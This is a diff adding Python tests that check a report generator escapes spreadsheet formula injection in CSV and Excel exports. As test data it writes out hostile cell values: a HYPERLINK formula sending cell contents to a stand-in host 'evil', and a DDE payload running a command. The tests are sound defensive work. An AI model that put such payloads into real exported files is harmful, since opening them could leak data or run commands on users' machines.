@@ -12,7 +12,7 @@ import io
 
 import openpyxl
 
-from modules.report_generator import flatten, generate_csv, generate_excel, generate_pdf
+from modules.report_generator import _sanitize_cell, flatten, generate_csv, generate_excel, generate_pdf
 
 
 def _result_with_checklist(**overrides):
@@ -106,3 +106,47 @@ def test_generate_pdf_returns_nonempty_bytes_with_and_without_checklist():
     data = generate_pdf([_result_with_checklist(), _result_without_checklist()])
     assert isinstance(data, bytes)
     assert len(data) > 0
+
+
+def test_sanitize_cell_neutralizes_formula_trigger_chars():
+    # A page-controlled title/anchor-text/etc. starting with one of these
+    # would otherwise be interpreted as a formula by Excel/Sheets on open.
+    for trigger in ("=", "+", "-", "@"):
+        malicious = f'{trigger}HYPERLINK("http://evil/?"&A1,"x")'
+        assert _sanitize_cell(malicious) == f"'{malicious}"
+
+
+def test_sanitize_cell_leaves_normal_values_untouched():
+    assert _sanitize_cell("Normal Page Title") == "Normal Page Title"
+    assert _sanitize_cell(42) == 42
+    assert _sanitize_cell(True) is True
+    assert _sanitize_cell("") == ""
+
+
+def test_flatten_sanitizes_formula_injection_in_title():
+    result = _result_with_checklist()
+    result["metadata"] = {"title": '=cmd|"/c calc"!A1', "title_length": 15}
+    row = flatten(result)
+    assert row["Meta Title"] == '\'=cmd|"/c calc"!A1'
+
+
+def test_generate_csv_sanitizes_malicious_issue_text():
+    result = _result_with_checklist()
+    result["all_issues"] = [
+        {"issue": "=SUM(1+1)", "category": "Meta", "severity": "High", "recommendation": "n/a"},
+    ]
+    data = generate_csv([result])
+    reader = csv.DictReader(io.StringIO(data.decode("utf-8")))
+    # Total Issues column reflects the count; the malicious title itself only
+    # flows into the "All Issues" Excel sheet, not the CSV summary row, so
+    # assert on the Excel path below for the actual sanitized issue text.
+    rows = list(reader)
+    assert rows[0]["Total Issues"] == "1"
+
+    xlsx = generate_excel([result])
+    wb = openpyxl.load_workbook(io.BytesIO(xlsx))
+    ws = wb["All Issues"]
+    header = [c.value for c in next(ws.iter_rows(min_row=1, max_row=1))]
+    issue_col = header.index("Issue")
+    first_row = [c.value for c in next(ws.iter_rows(min_row=2, max_row=2))]
+    assert first_row[issue_col] == "'=SUM(1+1)"
